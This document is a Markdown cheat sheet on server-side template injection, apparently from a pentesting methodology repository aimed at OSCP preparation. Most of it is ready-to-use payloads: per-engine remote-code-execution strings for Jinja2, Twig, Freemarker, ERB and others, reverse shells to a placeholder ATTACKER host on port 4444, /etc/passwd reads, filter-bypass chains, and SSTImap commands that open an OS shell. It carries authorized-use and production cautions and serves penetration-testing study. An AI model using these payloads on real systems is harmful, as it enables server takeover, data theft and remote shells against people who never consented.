# SSTI (Server-Side Template Injection)

> SSTI: attacker-controlled input is rendered by a template engine
> (Jinja2, Twig, Freemarker, ERB, etc.). Often leads to RCE.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Exploitation by Engine](#4-exploitation-by-engine)
- [5. Common Payloads](#5-common-payloads)
- [6. Filter Bypass](#6-filter-bypass)
- [7. Tools](#7-tools)
- [8. OSCP Notes](#8-oscp-notes)
- [9. Cheatsheet](#9-cheatsheet)
- [10. References](#10-references)

---

## 1. Overview

SSTI = template engine evaluates user input as template code instead of
treating it as data.

**Common engines:**

| Engine | Language | Syntax | Notes |
|--------|----------|--------|-------|
| Jinja2 | Python (Flask, Django) | {{...}} {%...%} | Most common on OSCP |
| Twig | PHP (Symfony) | {{...}} {%...%} | Second most common |
| Freemarker | Java | ${...} <#...> | Spring, Java apps |
| ERB | Ruby (Rails) | <%%= ... %%> | Direct Ruby eval |
| Smarty | PHP | {} {if} | Legacy PHP |
| Mako | Python | ${...} <%%...%%> | Pyramid, older Python |
| Pebble | Java | {{...}} {%...%} | Spring alternatives |
| Velocity | Java |  #if | Older Java apps |
| Handlebars / Nunjucks | Node.js | {{...}} | Often logic-less |

**Impact:**

- Info disclosure (config, env vars).
- File read.
- Command execution.
- Reverse shell.

**On OSCP:** SSTI is a strong foothold. Detection is fast ({{7*7}} -> 49),
and Jinja2/Twig payloads usually give RCE in minutes.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Math probe ({{7*7}}) | [PROD-RISK] |
| Info disclosure (config, env) | [PROD-RISK] |
| File read | [PROD-NO] |
| Command execution (id, whoami) | [PROD-NO] |
| Reverse shell | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT execute destructive commands.
- Do NOT open reverse shells without approval.
- Do NOT read secrets (env vars, DB creds) unless in scope.
- Do NOT leave injected templates persistent (some apps cache them).

In production, prove SSTI with a math probe and stop.

### 2.3 Rate limiting

SSTI probes are individual requests. Do not fuzz aggressively in production.

---

## 3. Detection

### 3.1 Basic probes

Send a math expression in a template tag:

```bash
curl 'http://target/hello?name={{7*7}}'
curl 'http://target/hello?name=${7*7}'
curl 'http://target/hello?name=<%%= 7*7 %%>'
```

**Expected output (if vulnerable):**

```text
Hello 49
```

If you see 49 instead of the literal {{7*7}}, the input is rendered.

### 3.2 Polyglot probe

The PortSwigger polyglot triggers errors in most engines and reveals
which one is in use:

```text
${{<%[%'"}}%\\
```

URL-encode and send:

```bash
curl 'http://target/hello?name=%24%7B%3C%25%5B%25%27%22%7D%7D%25%5C'
```

Read the error message to identify the engine (e.g. jinja2.exceptions,
Twig\\\\Error\\\\SyntaxError, reemarker.core.ParseException).

### 3.3 Identification tree

| Probe | Result | Engine |
|-------|--------|--------|
| {{7*7}} | 49 | Jinja2 / Twig / Pebble / Nunjucks |
| {{7*'7'}} | 7777777 | Jinja2 (string repeat) |
| {{7*'7'}} | 49 | Twig (numeric coercion) |
| ${7*7} | 49 | Freemarker / Mako / Velocity |
| <%%= 7*7 %%> | 49 | ERB (Ruby) |
| #{7*7} | 49 | Ruby (some contexts) |

**Narrowing Jinja2 vs Twig:**

```text
{{7*'7'}}   Jinja2: 7777777   Twig: 49
{{config}}  Jinja2: leaks Flask config   Twig: error
```

---

## 4. Exploitation by Engine

### 4.1 Jinja2 (Python)

**Info disclosure:**

```jinja2
{{ config }}
{{ config.items() }}
{{ request.application.__globals__ }}
```

**File read via globals:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

**Command execution:**

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

**Reverse shell:**

```jinja2
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i &> /dev/tcp/ATTACKER/4444 0&>1"').read() }}
```

### 4.2 Twig (PHP)

**Info disclosure:**

```twig
{{ _self }}
{{ _self.env }}
```

**Command execution (Twig < 1.20 / legacy):**

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

**Command execution (Twig 2.x / 3.x, filter chain):**

```twig
{{ ['id'] | filter('system') }}
{{ ['id',0] | sort('system') | join }}
{{ ['id'] | map('system') | join }}
```

**Reverse shell:**

```twig
{{ ['bash -c "bash -i &> /dev/tcp/ATTACKER/4444 0&>1"'] | filter('system') }}
```

### 4.3 Freemarker (Java)

**Info disclosure:**

```freemarker
${7*7}
${.data_model}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

**Command execution:**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("bash -c ''bash -i &> /dev/tcp/ATTACKER/4444 0&>1''")}
${ex("whoami")}
```

**Reverse shell:**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("bash -c ''bash -i &> /dev/tcp/ATTACKER/4444 0&>1''")}
```

### 4.4 ERB (Ruby)

**Info disclosure:**

```erb
<%%= 7*7 %%>
<%%= system('id') %%>
<%%= id %%>
```

**Command execution:**

```erb
<%%= system('id') %%>
<%%= IO.popen('id').read %%>
```

**Reverse shell:**

```erb
<%= system(''bash -c "bash -i &> /dev/tcp/ATTACKER/4444 0&>1"'') %>
```

### 4.5 Other engines

| Engine | Basic RCE |
|--------|-----------|
| Smarty (PHP) | {php}system('id');{/php} or {system('id')} (depends on version) |
| Mako (Python) | ${self.module.cache.util.os.popen('id').read()} |
| Pebble (Java) | {% set cmd = 'id' %}{{ cmd }} with reflection chain (see PayloadsAllTheThings) |
| Velocity (Java) | #set(='') #set(=.class.forName('java.lang.Runtime')) ... |
| Nunjucks (Node.js) | {{range.constructor("return global.process.mainModule.require(''child_process'').execSync(''id'')")()}} |
| Handlebars (Node.js) | Often logic-less; use prototype pollution or JSON helpers if available |

Full payloads per engine: see PayloadsAllTheThings (section 10).

---

## 5. Common Payloads

### 5.1 File read

```jinja2
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

```twig
{{ source('/etc/passwd') }}
```

### 5.2 Command execution

See section 4 (per engine).

### 5.3 Reverse shell

Use one of the OS-specific reverse shells from
[Command-Injection.md](./Command-Injection.md) section 4.4, wrapped in the
engine-specific RCE.

---

## 6. Filter Bypass

### 6.1 General strategies

If {{, _, ., [], keywords (class, system, os) are filtered:

- **Underscore bypass (Jinja2):** use hex \\x5f\\x5f or octal \\137\\137.
- **Dot bypass (Jinja2):** use |attr('name') instead of .name.
- **Bracket bypass (Jinja2):** use |attr() and |map().
- **Keyword bypass:** encode as hex, then decode() at runtime.
- **Alternative blocks:** {%...%} if {{...}} is blocked.

### 6.2 Jinja2 bypass examples

**Without .:**

```jinja2
{{ request|attr('application')|attr('__globals__') }}
```

**Without _ and . and []:**

```jinja2
{{ request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')() }}
```

### 6.3 Twig bypass examples

**Without _self:**

```twig
{{ ['id'] | filter('system') }}
{{ ['id'] | map('system') | join }}
```

### 6.4 WAF

See [WAF-Detection.md](../01%20Recon/WAF-Detection.md) section 6 for encoding
strategies. SSTI-specific triggers are {{, }}, ${, <%%, %%>.

---

## 7. Tools

| Tool | Purpose |
|------|---------|
| SSTImap | Automatic SSTI exploitation (active fork) |
| tplmap | Classic SSTI tool (2017, less maintained) |
| Burp Suite | Manual testing |
| PayloadsAllTheThings | Engine-specific payloads |

Examples:

```bash
# SSTImap
python3 sstimap.py -u 'http://target/hello?name=INJECT'
python3 sstimap.py -u 'http://target/hello?name=INJECT' --os-shell

# tplmap
python2 tplmap.py -u 'http://target/hello?name=INJECT'
```

---

## 8. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the math probe ({{7*7}} -> 49).
> - Screenshot the engine identification.
> - Screenshot the RCE (id / whoami).
> - Screenshot the reverse shell if used.
>
> SSTI to RCE is a strong foothold proof. Show the chain: probe -> engine
> -> RCE -> shell.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 9. Cheatsheet

```text
Probes:           {{7*7}}   ${7*7}   <%%= 7*7 %%>   #{7*7}
Jinja2/Twig ID:   {{7*'7'}}  Jinja2->7777777  Twig->49
Polyglot:         ${{<%[%'"}}%\\
```

```jinja2
# Jinja2 RCE
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

```twig
# Twig legacy RCE
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}

# Twig 2.x/3.x RCE
{{ ['id'] | filter('system') }}
```

```freemarker
# Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

```erb
# ERB RCE
<%%= system('id') %%>
```

---

## 10. References

- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- SSTImap: https://github.com/vladko312/SSTImap
- tplmap: https://github.com/epinna/tplmap
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/SSTI.md](../06%20Technologies/SSTI.md), [Command-Injection.md](./Command-Injection.md)

---

*Part of MethodMan. English only by design. Last updated: 2026-10-11.*
